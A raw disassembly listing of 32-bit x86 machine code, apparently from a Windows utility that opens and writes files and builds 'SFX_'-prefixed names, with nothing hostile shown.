 100323b:	0f 84 7a 01 00 00    	je     0x10033bb
 1003241:	8b 3d 14 21 00 01    	mov    0x1002114,%edi
 1003247:	eb 0c                	jmp    0x1003255
 1003249:	8b 8d f8 fe ff ff    	mov    -0x108(%ebp),%ecx
 100324f:	8b 85 e4 fe ff ff    	mov    -0x11c(%ebp),%eax
 1003255:	8b d1                	mov    %ecx,%edx
 1003257:	83 c1 04             	add    $0x4,%ecx
 100325a:	3b c8                	cmp    %eax,%ecx
 100325c:	89 95 f0 fe ff ff    	mov    %edx,-0x110(%ebp)
 1003262:	0f 87 53 01 00 00    	ja     0x10033bb
 1003268:	66 8b 02             	mov    (%edx),%ax
 100326b:	a8 01                	test   $0x1,%al
 100326d:	0f 85 48 01 00 00    	jne    0x10033bb
 1003273:	f6 42 02 01          	testb  $0x1,0x2(%edx)
 1003277:	0f 85 3e 01 00 00    	jne    0x10033bb
 100327d:	0f b7 52 02          	movzwl 0x2(%edx),%edx
 1003281:	0f b7 c0             	movzwl %ax,%eax
 1003284:	8b f1                	mov    %ecx,%esi
 1003286:	03 c8                	add    %eax,%ecx
 1003288:	89 8d e8 fe ff ff    	mov    %ecx,-0x118(%ebp)
 100328e:	03 ca                	add    %edx,%ecx
 1003290:	3b 8d e4 fe ff ff    	cmp    -0x11c(%ebp),%ecx
 1003296:	89 8d f8 fe ff ff    	mov    %ecx,-0x108(%ebp)
 100329c:	0f 87 19 01 00 00    	ja     0x10033bb
 10032a2:	8b 8d e8 fe ff ff    	mov    -0x118(%ebp),%ecx
 10032a8:	d1 e8                	shr    $1,%eax
 10032aa:	66 89 5c 46 fe       	mov    %bx,-0x2(%esi,%eax,2)
 10032af:	8b 85 f0 fe ff ff    	mov    -0x110(%ebp),%eax
 10032b5:	0f b7 40 02          	movzwl 0x2(%eax),%eax
 10032b9:	6a 02                	push   $0x2
 10032bb:	d1 e8                	shr    $1,%eax
 10032bd:	66 89 5c 41 fe       	mov    %bx,-0x2(%ecx,%eax,2)
 10032c2:	58                   	pop    %eax
 10032c3:	2b f0                	sub    %eax,%esi
 10032c5:	66 c7 06 5f 00       	movw   $0x5f,(%esi)
 10032ca:	2b f0                	sub    %eax,%esi
 10032cc:	66 c7 06 58 00       	movw   $0x58,(%esi)
 10032d1:	2b f0                	sub    %eax,%esi
 10032d3:	66 c7 06 46 00       	movw   $0x46,(%esi)
 10032d8:	2b f0                	sub    %eax,%esi
 10032da:	66 c7 06 53 00       	movw   $0x53,(%esi)
 10032df:	2b f0                	sub    %eax,%esi
 10032e1:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
 10032e7:	50                   	push   %eax
 10032e8:	53                   	push   %ebx
 10032e9:	53                   	push   %ebx
 10032ea:	53                   	push   %ebx
 10032eb:	6a ff                	push   $0xffffffff
 10032ed:	56                   	push   %esi
 10032ee:	53                   	push   %ebx
 10032ef:	53                   	push   %ebx
 10032f0:	66 c7 06 5f 00       	movw   $0x5f,(%esi)
 10032f5:	ff d7                	call   *%edi
 10032f7:	3b c3                	cmp    %ebx,%eax
 10032f9:	89 85 00 ff ff ff    	mov    %eax,-0x100(%ebp)
 10032ff:	0f 84 aa 00 00 00    	je     0x10033af
 1003305:	39 9d fc fe ff ff    	cmp    %ebx,-0x104(%ebp)
 100330b:	0f 85 9e 00 00 00    	jne    0x10033af
 1003311:	50                   	push   %eax
 1003312:	6a 08                	push   $0x8
 1003314:	ff 35 78 d0 00 01    	push   0x100d078
 100331a:	ff 15 18 21 00 01    	call   *0x1002118
 1003320:	3b c3                	cmp    %ebx,%eax
 1003322:	89 85 f0 fe ff ff    	mov    %eax,-0x110(%ebp)
 1003328:	0f 84 8d 00 00 00    	je     0x10033bb
 100332e:	53                   	push   %ebx
 100332f:	53                   	push   %ebx
 1003330:	ff b5 00 ff ff ff    	push   -0x100(%ebp)
 1003336:	50                   	push   %eax
 1003337:	6a ff                	push   $0xffffffff
 1003339:	56                   	push   %esi
 100333a:	53                   	push   %ebx
 100333b:	53                   	push   %ebx
 100333c:	ff d7                	call   *%edi
 100333e:	53                   	push   %ebx
 100333f:	53                   	push   %ebx
 1003340:	ff b5 f0 fe ff ff    	push   -0x110(%ebp)
 1003346:	ff 15 10 21 00 01    	call   *0x1002110
 100334c:	85 c0                	test   %eax,%eax
 100334e:	75 5f                	jne    0x10033af
 1003350:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
 1003356:	50                   	push   %eax
 1003357:	53                   	push   %ebx
 1003358:	53                   	push   %ebx
 1003359:	53                   	push   %ebx
 100335a:	6a ff                	push   $0xffffffff
 100335c:	ff b5 e8 fe ff ff    	push   -0x118(%ebp)
 1003362:	53                   	push   %ebx
 1003363:	53                   	push   %ebx
 1003364:	ff d7                	call   *%edi
 1003366:	3b c3                	cmp    %ebx,%eax
 1003368:	89 85 00 ff ff ff    	mov    %eax,-0x100(%ebp)
 100336e:	74 3f                	je     0x10033af
 1003370:	39 9d fc fe ff ff    	cmp    %ebx,-0x104(%ebp)
 1003376:	75 37                	jne    0x10033af
 1003378:	50                   	push   %eax
 1003379:	6a 08                	push   $0x8
 100337b:	ff 35 78 d0 00 01    	push   0x100d078
 1003381:	ff 15 18 21 00 01    	call   *0x1002118
 1003387:	8b f0                	mov    %eax,%esi
 1003389:	3b f3                	cmp    %ebx,%esi
 100338b:	74 2e                	je     0x10033bb
 100338d:	53                   	push   %ebx
 100338e:	53                   	push   %ebx
 100338f:	ff b5 00 ff ff ff    	push   -0x100(%ebp)
 1003395:	56                   	push   %esi
 1003396:	6a ff                	push   $0xffffffff
 1003398:	ff b5 e8 fe ff ff    	push   -0x118(%ebp)
 100339e:	53                   	push   %ebx
 100339f:	53                   	push   %ebx
 10033a0:	ff d7                	call   *%edi
 10033a2:	56                   	push   %esi
 10033a3:	ff b5 f0 fe ff ff    	push   -0x110(%ebp)
 10033a9:	ff 15 0c 21 00 01    	call   *0x100210c
 10033af:	ff 8d ec fe ff ff    	decl   -0x114(%ebp)
 10033b5:	0f 85 8e fe ff ff    	jne    0x1003249
 10033bb:	ff b5 f4 fe ff ff    	push   -0x10c(%ebp)
 10033c1:	ff 15 d4 20 00 01    	call   *0x10020d4
 10033c7:	5f                   	pop    %edi
 10033c8:	5e                   	pop    %esi
 10033c9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 10033cc:	5b                   	pop    %ebx
 10033cd:	e8 2d 2f 00 00       	call   0x10062ff
 10033d2:	c9                   	leave
 10033d3:	c2 04 00             	ret    $0x4
 10033d6:	cc                   	int3
 10033d7:	cc                   	int3
 10033d8:	cc                   	int3
 10033d9:	cc                   	int3
 10033da:	cc                   	int3
 10033db:	8b ff                	mov    %edi,%edi
 10033dd:	55                   	push   %ebp
 10033de:	8b ec                	mov    %esp,%ebp
 10033e0:	51                   	push   %ecx
 10033e1:	51                   	push   %ecx
 10033e2:	53                   	push   %ebx
 10033e3:	56                   	push   %esi
 10033e4:	ff 15 b4 20 00 01    	call   *0x10020b4
 10033ea:	89 45 f8             	mov    %eax,-0x8(%ebp)
 10033ed:	a1 44 d0 00 01       	mov    0x100d044,%eax
 10033f2:	33 db                	xor    %ebx,%ebx
 10033f4:	3b c3                	cmp    %ebx,%eax
 10033f6:	74 5d                	je     0x1003455
 10033f8:	6a 02                	push   $0x2
 10033fa:	53                   	push   %ebx
 10033fb:	53                   	push   %ebx
 10033fc:	50                   	push   %eax
 10033fd:	ff 15 a8 20 00 01    	call   *0x10020a8
 1003403:	8b 45 08             	mov    0x8(%ebp),%eax
 1003406:	8d 70 01             	lea    0x1(%eax),%esi
 1003409:	8a 08                	mov    (%eax),%cl
 100340b:	40                   	inc    %eax
 100340c:	3a cb                	cmp    %bl,%cl
 100340e:	75 f9                	jne    0x1003409
 1003410:	53                   	push   %ebx
 1003411:	8d 4d fc             	lea    -0x4(%ebp),%ecx
 1003414:	51                   	push   %ecx
 1003415:	2b c6                	sub    %esi,%eax
 1003417:	8b 35 20 21 00 01    	mov    0x1002120,%esi
 100341d:	50                   	push   %eax
 100341e:	ff 75 08             	push   0x8(%ebp)
 1003421:	ff 35 44 d0 00 01    	push   0x100d044
 1003427:	ff d6                	call   *%esi
 1003429:	85 c0                	test   %eax,%eax
 100342b:	74 2b                	je     0x1003458
 100342d:	b9 ec 22 00 01       	mov    $0x10022ec,%ecx
 1003432:	8b c1                	mov    %ecx,%eax
 1003434:	57                   	push   %edi
 1003435:	8d 78 01             	lea    0x1(%eax),%edi
 1003438:	8a 10                	mov    (%eax),%dl
 100343a:	40                   	inc    %eax
 100343b:	3a d3                	cmp    %bl,%dl
 100343d:	75 f9                	jne    0x1003438
 100343f:	53                   	push   %ebx
 1003440:	8d 55 fc             	lea    -0x4(%ebp),%edx
 1003443:	52                   	push   %edx
 1003444:	2b c7                	sub    %edi,%eax
 1003446:	50                   	push   %eax
 1003447:	51                   	push   %ecx
 1003448:	ff 35 44 d0 00 01    	push   0x100d044
 100344e:	ff d6                	call   *%esi
 1003450:	85 c0                	test   %eax,%eax
 1003452:	5f                   	pop    %edi
 1003453:	74 03                	je     0x1003458
 1003455:	33 db                	xor    %ebx,%ebx
 1003457:	43                   	inc    %ebx
 1003458:	ff 75 f8             	push   -0x8(%ebp)
 100345b:	ff 15 1c 21 00 01    	call   *0x100211c
 1003461:	5e                   	pop    %esi
 1003462:	8b c3                	mov    %ebx,%eax
 1003464:	5b                   	pop    %ebx
 1003465:	c9                   	leave
 1003466:	c2 04 00             	ret    $0x4
 1003469:	cc                   	int3
 100346a:	cc                   	int3
 100346b:	cc                   	int3
 100346c:	cc                   	int3
 100346d:	cc                   	int3
 100346e:	8b ff                	mov    %edi,%edi
 1003470:	55                   	push   %ebp
 1003471:	8b ec                	mov    %esp,%ebp
 1003473:	51                   	push   %ecx
 1003474:	a1 44 d0 00 01       	mov    0x100d044,%eax
 1003479:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
 100347d:	83 f8 ff             	cmp    $0xffffffff,%eax
 1003480:	56                   	push   %esi
 1003481:	8b 35 d4 20 00 01    	mov    0x10020d4,%esi
 1003487:	74 0b                	je     0x1003494
 1003489:	50                   	push   %eax
 100348a:	ff d6                	call   *%esi
 100348c:	83 c8 ff             	or     $0xffffffff,%eax
 100348f:	a3 44 d0 00 01       	mov    %eax,0x100d044
 1003494:	80 3d 00 cd 00 01 00 	cmpb   $0x0,0x100cd00
 100349b:	74 3b                	je     0x10034d8
 100349d:	6a 00                	push   $0x0
 100349f:	68 80 00 00 00       	push   $0x80
 10034a4:	6a 03                	push   $0x3
 10034a6:	6a 00                	push   $0x0
 10034a8:	6a 03                	push   $0x3
 10034aa:	68 00 00 00 c0       	push   $0xc0000000
 10034af:	68 00 cd 00 01       	push   $0x100cd00
 10034b4:	ff 15 dc 20 00 01    	call   *0x10020dc
 10034ba:	83 f8 ff             	cmp    $0xffffffff,%eax
 10034bd:	a3 44 d0 00 01       	mov    %eax,0x100d044
 10034c2:	74 23                	je     0x10034e7
 10034c4:	ff 75 08             	push   0x8(%ebp)
 10034c7:	e8 0f ff ff ff       	call   0x10033db
 10034cc:	a1 44 d0 00 01       	mov    0x100d044,%eax
 10034d1:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
 10034d8:	83 f8 ff             	cmp    $0xffffffff,%eax
 10034db:	74 0a                	je     0x10034e7
 10034dd:	50                   	push   %eax
 10034de:	ff d6                	call   *%esi
 10034e0:	83 0d 44 d0 00 01 ff 	orl    $0xffffffff,0x100d044
 10034e7:	8b 45 fc             	mov    -0x4(%ebp),%eax
 10034ea:	5e                   	pop    %esi
 10034eb:	c9                   	leave
 10034ec:	c2 04 00             	ret    $0x4
 10034ef:	cc                   	int3
 10034f0:	cc                   	int3
 10034f1:	cc                   	int3
 10034f2:	cc                   	int3
 10034f3:	cc                   	int3
 10034f4:	8b ff                	mov    %edi,%edi
 10034f6:	55                   	push   %ebp
 10034f7:	8b ec                	mov    %esp,%ebp
 10034f9:	83 ec 10             	sub    $0x10,%esp
 10034fc:	8b 45 08             	mov    0x8(%ebp),%eax
 10034ff:	99                   	cltd
 1003500:	89 45 f4             	mov    %eax,-0xc(%ebp)
 1003503:	8b 45 0c             	mov    0xc(%ebp),%eax
 1003506:	56                   	push   %esi
 1003507:	33 f6                	xor    %esi,%esi
 1003509:	2b c6                	sub    %esi,%eax
 100350b:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
 1003512:	89 55 f8             	mov    %edx,-0x8(%ebp)
 1003515:	74 08                	je     0x100351f
 1003517:	48                   	dec    %eax
 1003518:	75 65                	jne    0x100357f
 100351a:	21 75 fc             	and    %esi,-0x4(%ebp)
 100351d:	eb 07                	jmp    0x1003526
 100351f:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
 1003526:	8d 45 08             	lea    0x8(%ebp),%eax
 1003529:	50                   	push   %eax
 100352a:	6a 28                	push   $0x28
 100352c:	6a ff                	push   $0xffffffff
 100352e:	ff 15 f4 21 00 01    	call   *0x10021f4
 1003534:	85 c0                	test   %eax,%eax
 1003536:	7d 0c                	jge    0x1003544
 1003538:	68 f8 22 00 01       	push   $0x10022f8
 100353d:	e8 2c ff ff ff       	call   0x100346e
 1003542:	eb 3b                	jmp    0x100357f
 1003544:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
 1003548:	8b 45 14             	mov    0x14(%ebp),%eax
 100354b:	74 06                	je     0x1003553
 100354d:	85 c0                	test   %eax,%eax
 100354f:	74 02                	je     0x1003553
 1003551:	8b 30                	mov    (%eax),%esi
 1003553:	50                   	push   %eax
 1003554:	ff 75 10             	push   0x10(%ebp)
 1003557:	8d 45 f0             	lea    -0x10(%ebp),%eax
 100355a:	56                   	push   %esi
 100355b:	50                   	push   %eax
 100355c:	6a 00                	push   $0x0
 100355e:	ff 75 08             	push   0x8(%ebp)
 1003561:	ff 15 f8 21 00 01    	call   *0x10021f8
 1003567:	85 c0                	test   %eax,%eax
 1003569:	ff 75 08             	push   0x8(%ebp)
 100356c:	7c 0b                	jl     0x1003579
 100356e:	ff 15 fc 21 00 01    	call   *0x10021fc
 1003574:	33 c0                	xor    %eax,%eax
 1003576:	40                   	inc    %eax
 1003577:	eb 08                	jmp    0x1003581
 1003579:	ff 15 fc 21 00 01    	call   *0x10021fc
 100357f:	33 c0                	xor    %eax,%eax
 1003581:	5e                   	pop    %esi
 1003582:	c9                   	leave
 1003583:	c2 10 00             	ret    $0x10
 1003586:	cc                   	int3
 1003587:	cc                   	int3
 1003588:	cc                   	int3
 1003589:	cc                   	int3
 100358a:	cc                   	int3
 100358b:	8b ff                	mov    %edi,%edi
 100358d:	55                   	push   %ebp
 100358e:	8b ec                	mov    %esp,%ebp
 1003590:	51                   	push   %ecx
 1003591:	56                   	push   %esi
 1003592:	33 f6                	xor    %esi,%esi
 1003594:	39 75 08             	cmp    %esi,0x8(%ebp)
 1003597:	74 53                	je     0x10035ec
 1003599:	8d 45 fc             	lea    -0x4(%ebp),%eax
 100359c:	50                   	push   %eax
 100359d:	6a 28                	push   $0x28
 100359f:	6a ff                	push   $0xffffffff
 10035a1:	ff 15 f4 21 00 01    	call   *0x10021f4
 10035a7:	85 c0                	test   %eax,%eax
 10035a9:	7d 0c                	jge    0x10035b7
 10035ab:	68 48 23 00 01       	push   $0x1002348
 10035b0:	e8 b9 fe ff ff       	call   0x100346e
 10035b5:	eb 35                	jmp    0x10035ec
 10035b7:	56                   	push   %esi
 10035b8:	56                   	push   %esi
 10035b9:	56                   	push   %esi
 10035ba:	ff 75 08             	push   0x8(%ebp)
 10035bd:	56                   	push   %esi
 10035be:	ff 75 fc             	push   -0x4(%ebp)
 10035c1:	ff 15 f8 21 00 01    	call   *0x10021f8
 10035c7:	85 c0                	test   %eax,%eax
 10035c9:	7c 0e                	jl     0x10035d9
 10035cb:	ff 75 fc             	push   -0x4(%ebp)
 10035ce:	ff 15 fc 21 00 01    	call   *0x10021fc
 10035d4:	33 c0                	xor    %eax,%eax
 10035d6:	40                   	inc    %eax
 10035d7:	eb 15                	jmp    0x10035ee
 10035d9:	68 14 23 00 01       	push   $0x1002314
 10035de:	e8 8b fe ff ff       	call   0x100346e
 10035e3:	ff 75 fc             	push   -0x4(%ebp)
 10035e6:	ff 15 fc 21 00 01    	call   *0x10021fc
 10035ec:	33 c0                	xor    %eax,%eax
 10035ee:	5e                   	pop    %esi
 10035ef:	c9                   	leave
 10035f0:	c2 04 00             	ret    $0x4
 10035f3:	cc                   	int3
 10035f4:	cc                   	int3
 10035f5:	cc                   	int3
 10035f6:	cc                   	int3
 10035f7:	cc                   	int3
 10035f8:	33 c0                	xor    %eax,%eax
 10035fa:	c2 10 00             	ret    $0x10
 10035fd:	cc                   	int3
 10035fe:	cc                   	int3
 10035ff:	cc                   	int3
 1003600:	cc                   	int3
 1003601:	cc                   	int3
 1003602:	33 c0                	xor    %eax,%eax
 1003604:	c2 24 00             	ret    $0x24
 1003607:	cc                   	int3
 1003608:	cc                   	int3
 1003609:	cc                   	int3
 100360a:	cc                   	int3
 100360b:	cc                   	int3
 100360c:	8b ff                	mov    %edi,%edi
 100360e:	55                   	push   %ebp
 100360f:	8b ec                	mov    %esp,%ebp
 1003611:	81 ec 10 03 00 00    	sub    $0x310,%esp
 1003617:	83 3d 44 c0 00 01 00 	cmpl   $0x0,0x100c044
 100361e:	a1 28 c0 00 01       	mov    0x100c028,%eax
 1003623:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1003626:	8b 45 08             	mov    0x8(%ebp),%eax
 1003629:	0f 85 cb 00 00 00    	jne    0x10036fa
 100362f:	56                   	push   %esi
 1003630:	68 bc 23 00 01       	push   $0x10023bc
 1003635:	68 b4 23 00 01       	push   $0x10023b4
 100363a:	50                   	push   %eax
 100363b:	e8 b9 2b 00 00       	call   0x10061f9
 1003640:	85 c0                	test   %eax,%eax
 1003642:	be 04 01 00 00       	mov    $0x104,%esi
 1003647:	74 29                	je     0x1003672
 1003649:	56                   	push   %esi
 100364a:	8d 8d f4 fd ff ff    	lea    -0x20c(%ebp),%ecx
 1003650:	51                   	push   %ecx
 1003651:	6a 01                	push   $0x1
 1003653:	50                   	push   %eax
 1003654:	e8 65 2a 00 00       	call   0x10060be
 1003659:	85 c0                	test   %eax,%eax
 100365b:	74 15                	je     0x1003672
 100365d:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
 1003663:	50                   	push   %eax
 1003664:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
 100366a:	50                   	push   %eax
 100366b:	68 80 d0 00 01       	push   $0x100d080
 1003670:	eb 21                	jmp    0x1003693
 1003672:	56                   	push   %esi
 1003673:	8d 85 f0 fc ff ff    	lea    -0x310(%ebp),%eax
 1003679:	50                   	push   %eax
 100367a:	ff 15 d0 20 00 01    	call   *0x10020d0
 1003680:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
 1003686:	50                   	push   %eax
 1003687:	68 a4 23 00 01       	push   $0x10023a4
 100368c:	8d 85 f0 fc ff ff    	lea    -0x310(%ebp),%eax
 1003692:	50                   	push   %eax
 1003693:	e8 2c f5 ff ff       	call   0x1002bc4
 1003698:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
 100369e:	50                   	push   %eax
 100369f:	ff 15 cc 20 00 01    	call   *0x10020cc
 10036a5:	85 c0                	test   %eax,%eax
 10036a7:	a3 58 c0 00 01       	mov    %eax,0x100c058
 10036ac:	74 25                	je     0x10036d3
 10036ae:	8b 35 c8 20 00 01    	mov    0x10020c8,%esi
 10036b4:	68 8c 23 00 01       	push   $0x100238c
 10036b9:	50                   	push   %eax
 10036ba:	ff d6                	call   *%esi
 10036bc:	68 78 23 00 01       	push   $0x1002378
 10036c1:	ff 35 58 c0 00 01    	push   0x100c058
 10036c7:	a3 44 c0 00 01       	mov    %eax,0x100c044
 10036cc:	ff d6                	call   *%esi
 10036ce:	a3 40 c0 00 01       	mov    %eax,0x100c040
 10036d3:	83 3d 44 c0 00 01 00 	cmpl   $0x0,0x100c044
 10036da:	5e                   	pop    %esi
 10036db:	75 0a                	jne    0x10036e7
 10036dd:	c7 05 44 c0 00 01 02 	movl   $0x1003602,0x100c044
 10036e4:	36 00 01 
 10036e7:	83 3d 40 c0 00 01 00 	cmpl   $0x0,0x100c040
 10036ee:	75 0a                	jne    0x10036fa
 10036f0:	c7 05 40 c0 00 01 f8 	movl   $0x10035f8,0x100c040
 10036f7:	35 00 01 
 10036fa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 10036fd:	e8 fd 2b 00 00       	call   0x10062ff
 1003702:	c9                   	leave
 1003703:	c2 04 00             	ret    $0x4
 1003706:	cc                   	int3
 1003707:	cc                   	int3
 1003708:	cc                   	int3
 1003709:	cc                   	int3
 100370a:	cc                   	int3
 100370b:	a1 58 c0 00 01       	mov    0x100c058,%eax
 1003710:	85 c0                	test   %eax,%eax
 1003712:	74 0e                	je     0x1003722
 1003714:	50                   	push   %eax
 1003715:	ff 15 c4 20 00 01    	call   *0x10020c4
 100371b:	83 25 58 c0 00 01 00 	andl   $0x0,0x100c058
 1003722:	c7 05 44 c0 00 01 02 	movl   $0x1003602,0x100c044
 1003729:	36 00 01 
 100372c:	c7 05 40 c0 00 01 f8 	movl   $0x10035f8,0x100c040
 1003733:	35 00 01 
 1003736:	c3                   	ret
 1003737:	cc                   	int3
 1003738:	cc                   	int3
 1003739:	cc                   	int3
 100373a:	cc                   	int3
 100373b:	cc                   	int3
 100373c:	8b ff                	mov    %edi,%edi
 100373e:	55                   	push   %ebp
 100373f:	8b ec                	mov    %esp,%ebp
 1003741:	8b 45 10             	mov    0x10(%ebp),%eax
 1003744:	56                   	push   %esi
 1003745:	33 f6                	xor    %esi,%esi
 1003747:	46                   	inc    %esi
 1003748:	80 38 00             	cmpb   $0x0,(%eax)
 100374b:	74 10                	je     0x100375d
 100374d:	ff 75 08             	push   0x8(%ebp)
 1003750:	50                   	push   %eax
 1003751:	ff 15 24 21 00 01    	call   *0x1002124
 1003757:	85 c0                	test   %eax,%eax
 1003759:	75 02                	jne    0x100375d
 100375b:	33 f6                	xor    %esi,%esi
 100375d:	8b 45 14             	mov    0x14(%ebp),%eax
 1003760:	80 38 00             	cmpb   $0x0,(%eax)
 1003763:	74 12                	je     0x1003777
 1003765:	6a 01                	push   $0x1
 1003767:	ff 75 0c             	push   0xc(%ebp)
 100376a:	50                   	push   %eax
 100376b:	ff 15 ac 20 00 01    	call   *0x10020ac
 1003771:	85 c0                	test   %eax,%eax
 1003773:	75 02                	jne    0x1003777
 1003775:	33 f6                	xor    %esi,%esi
 1003777:	8b c6                	mov    %esi,%eax
 1003779:	5e                   	pop    %esi
 100377a:	5d                   	pop    %ebp
 100377b:	c2 10 00             	ret    $0x10
 100377e:	cc                   	int3
 100377f:	cc                   	int3
 1003780:	cc                   	int3
 1003781:	cc                   	int3
 1003782:	cc                   	int3
 1003783:	33 c0                	xor    %eax,%eax
 1003785:	c3                   	ret
 1003786:	cc                   	int3
 1003787:	cc                   	int3
 1003788:	cc                   	int3
 1003789:	cc                   	int3
 100378a:	cc                   	int3
 100378b:	c3                   	ret
 100378c:	cc                   	int3
 100378d:	cc                   	int3
 100378e:	cc                   	int3
 100378f:	cc                   	int3
 1003790:	cc                   	int3
 1003791:	8b ff                	mov    %edi,%edi
 1003793:	55                   	push   %ebp
 1003794:	8b ec                	mov    %esp,%ebp
 1003796:	81 7d 0c ff ff ff 7f 	cmpl   $0x7fffffff,0xc(%ebp)
 100379d:	76 07                	jbe    0x10037a6
 100379f:	b8 57 00 07 80       	mov    $0x80070057,%eax
 10037a4:	5d                   	pop    %ebp
 10037a5:	c3                   	ret
 10037a6:	8d 45 14             	lea    0x14(%ebp),%eax
 10037a9:	50                   	push   %eax
 10037aa:	ff 75 10             	push   0x10(%ebp)
 10037ad:	ff 75 0c             	push   0xc(%ebp)
 10037b0:	ff 75 08             	push   0x8(%ebp)
 10037b3:	e8 c1 ef ff ff       	call   0x1002779
 10037b8:	5d                   	pop    %ebp
 10037b9:	c3                   	ret
 10037ba:	cc                   	int3
 10037bb:	cc                   	int3
 10037bc:	cc                   	int3
 10037bd:	cc                   	int3
 10037be:	cc                   	int3
 10037bf:	8b ff                	mov    %edi,%edi
 10037c1:	55                   	push   %ebp
 10037c2:	8b ec                	mov    %esp,%ebp
 10037c4:	51                   	push   %ecx
 10037c5:	57                   	push   %edi
 10037c6:	33 ff                	xor    %edi,%edi
 10037c8:	57                   	push   %edi
 10037c9:	57                   	push   %edi
 10037ca:	68 d8 23 00 01       	push   $0x10023d8
 10037cf:	ff 15 10 21 00 01    	call   *0x1002110
 10037d5:	85 c0                	test   %eax,%eax
 10037d7:	0f 85 ad 00 00 00    	jne    0x100388a
 10037dd:	56                   	push   %esi
 10037de:	be c0 d2 00 01       	mov    $0x100d2c0,%esi
 10037e3:	56                   	push   %esi
 10037e4:	68 c8 23 00 01       	push   $0x10023c8
 10037e9:	68 80 d0 00 01       	push   $0x100d080
 10037ee:	e8 d1 f3 ff ff       	call   0x1002bc4
 10037f3:	57                   	push   %edi
 10037f4:	68 02 00 00 04       	push   $0x4000002
 10037f9:	6a 01                	push   $0x1
 10037fb:	57                   	push   %edi
 10037fc:	6a 03                	push   $0x3
 10037fe:	68 00 00 00 c0       	push   $0xc0000000
 1003803:	56                   	push   %esi
 1003804:	ff 15 dc 20 00 01    	call   *0x10020dc
 100380a:	8b d0                	mov    %eax,%edx
 100380c:	83 fa ff             	cmp    $0xffffffff,%edx
 100380f:	89 15 20 c0 00 01    	mov    %edx,0x100c020
 1003815:	74 72                	je     0x1003889
 1003817:	53                   	push   %ebx
 1003818:	33 c0                	xor    %eax,%eax
 100381a:	bb c0 c8 00 01       	mov    $0x100c8c0,%ebx
 100381f:	50                   	push   %eax
 1003820:	b9 c5 00 00 00       	mov    $0xc5,%ecx
 1003825:	8b fb                	mov    %ebx,%edi
 1003827:	f3 ab                	rep stos %eax,%es:(%edi)
 1003829:	a2 d0 ca 00 01       	mov    %al,0x100cad0
 100382e:	8d 45 fc             	lea    -0x4(%ebp),%eax
 1003831:	50                   	push   %eax
 1003832:	bf 14 03 00 00       	mov    $0x314,%edi
 1003837:	57                   	push   %edi
 1003838:	53                   	push   %ebx
 1003839:	52                   	push   %edx
 100383a:	c7 05 c0 c8 00 01 53 	movl   $0x6e776453,0x100c8c0
 1003841:	64 77 6e 
 1003844:	c7 05 c4 c8 00 01 00 	movl   $0x10000,0x100c8c4
 100384b:	00 01 00 
 100384e:	c7 05 c8 c8 00 01 13 	movl   $0xc0000013,0x100c8c8
 1003855:	00 00 c0 
 1003858:	ff 15 20 21 00 01    	call   *0x1002120
 100385e:	85 c0                	test   %eax,%eax
 1003860:	5b                   	pop    %ebx
 1003861:	74 13                	je     0x1003876
 1003863:	39 7d fc             	cmp    %edi,-0x4(%ebp)
 1003866:	75 0e                	jne    0x1003876
 1003868:	56                   	push   %esi
 1003869:	68 d8 23 00 01       	push   $0x10023d8
 100386e:	ff 15 0c 21 00 01    	call   *0x100210c
 1003874:	eb 13                	jmp    0x1003889
 1003876:	ff 35 20 c0 00 01    	push   0x100c020
 100387c:	ff 15 d4 20 00 01    	call   *0x10020d4
 1003882:	83 0d 20 c0 00 01 ff 	orl    $0xffffffff,0x100c020
 1003889:	5e                   	pop    %esi
 100388a:	5f                   	pop    %edi
 100388b:	c9                   	leave
 100388c:	c3                   	ret
 100388d:	cc                   	int3
 100388e:	cc                   	int3
 100388f:	cc                   	int3
 1003890:	cc                   	int3
 1003891:	cc                   	int3
 1003892:	8b ff                	mov    %edi,%edi
 1003894:	55                   	push   %ebp
 1003895:	8b ec                	mov    %esp,%ebp
 1003897:	81 ec 80 02 00 00    	sub    $0x280,%esp
 100389d:	56                   	push   %esi
 100389e:	8b 75 08             	mov    0x8(%ebp),%esi
 10038a1:	83 fe ff             	cmp    $0xffffffff,%esi
 10038a4:	75 08                	jne    0x10038ae
 10038a6:	ff 15 b4 20 00 01    	call   *0x10020b4
 10038ac:	8b f0                	mov    %eax,%esi
 10038ae:	83 3d e0 d3 01 01 00 	cmpl   $0x0,0x101d3e0
 10038b5:	75 58                	jne    0x100390f
 10038b7:	8d 85 80 fd ff ff    	lea    -0x280(%ebp),%eax
 10038bd:	50                   	push   %eax
 10038be:	68 00 02 00 00       	push   $0x200
 10038c3:	56                   	push   %esi
 10038c4:	e8 40 f4 ff ff       	call   0x1002d09
 10038c9:	8d 85 80 fd ff ff    	lea    -0x280(%ebp),%eax
 10038cf:	50                   	push   %eax
 10038d0:	e8 99 fb ff ff       	call   0x100346e
 10038d5:	68 80 00 00 00       	push   $0x80
 10038da:	8d 45 80             	lea    -0x80(%ebp),%eax
 10038dd:	50                   	push   %eax
 10038de:	68 03 00 00 20       	push   $0x20000003
 10038e3:	ff 35 5c c0 00 01    	push   0x100c05c
 10038e9:	c6 45 80 00          	movb   $0x0,-0x80(%ebp)
 10038ed:	ff 15 80 21 00 01    	call   *0x1002180
 10038f3:	68 10 00 01 00       	push   $0x10010
 10038f8:	8d 45 80             	lea    -0x80(%ebp),%eax
 10038fb:	50                   	push   %eax
 10038fc:	8d 85 80 fd ff ff    	lea    -0x280(%ebp),%eax
 1003902:	50                   	push   %eax
 1003903:	ff 35 04 ce 00 01    	push   0x100ce04
 1003909:	ff 15 74 21 00 01    	call   *0x1002174
 100390f:	e8 64 f4 ff ff       	call   0x1002d78
 1003914:	85 f6                	test   %esi,%esi
 1003916:	75 01                	jne    0x1003919
 1003918:	46                   	inc    %esi
 1003919:	83 3d 60 c0 00 01 00 	cmpl   $0x0,0x100c060
 1003920:	74 12                	je     0x1003934
